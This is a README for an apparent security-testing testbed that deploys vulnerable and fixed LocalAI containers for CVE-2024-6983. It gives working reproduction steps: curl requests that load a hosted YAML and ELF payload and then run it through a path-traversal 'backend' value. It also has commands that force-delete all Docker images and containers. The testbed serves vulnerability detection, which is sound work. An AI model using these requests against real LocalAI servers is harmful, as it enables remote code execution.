# Mudler/LocalAI CVE-2024-6983

This directory contains the deployment config for LocalAI instances vulnerable and fixed to CVE-2024-6983. LocalAI versions below 2.19.4 are vulnerable to that remote code execution vulnerability.

## How to Trigger the Vulnerability?

To trigger the vulnerability, you can use the following two curl commands and the provided Python Script called server.py. You may need to install Flask and PyInstaller via pip through requirements.txt. Since this vulnerability requires hosting a YAML and an ELF file, the provided Python script will host these files. In a vulnerable environment, after the second curl request, you can see the created file under the /tmp/ directory.

Curl Requests:

```sh
# Run above Python script first after installing the requirements.
pip install -r requirements.txt
python server.py

# Upload the yaml and compiled Python file
curl http://localhost:8080/models/apply -X POST -H "Content-Type: application/json" -d '{"name":"life","config_url":"http://localhost:8000/model.yaml","id":""}'

# Trigger the uploaded app.bin file via the backend parameter.
curl http://localhost:8080/embeddings -X POST -H "Content-Type: application/json" -d '{"backend":"../../../../../../build/models/app.bin","model":"life","input":"hi"}'

# Validate the created file by checking the docker inside.
docker exec -it local-ai bash --> ls /tmp/
```

In case you cannot trigger the vulnerability, you might need to delete your existing container images because Docker might try to reuse them.

```sh
sudo docker rmi -f $(sudo docker images -aq)
sudo docker remove $(sudo docker ps -a -q)
```

If you receive a Glibc error while running the exploit, it is because the version installed on your computer is newer than the LocalAI container. In this case, you can compile the payload with a lower version of Glibc using Docker in the link below.

- https://github.com/google/tsunami-security-scanner-plugins/tree/master/payloads/mudler_localai_rce
  
## Fixed version
```sh
docker run -p 8080:8080 -e "DEBUG=true" --name local-ai --network host -ti localai/localai:v2.19.4-ffmpeg-core
```

The deployed service listens on `localhost:8080` after the docker completes its job.

## Vulnerable version
```sh
docker run -p 8080:8080 -e "DEBUG=true" --name local-ai --network host -ti localai/localai:v2.14.0-ffmpeg-core
```

The deployed service listens on `localhost:8080` after the docker completes its job.
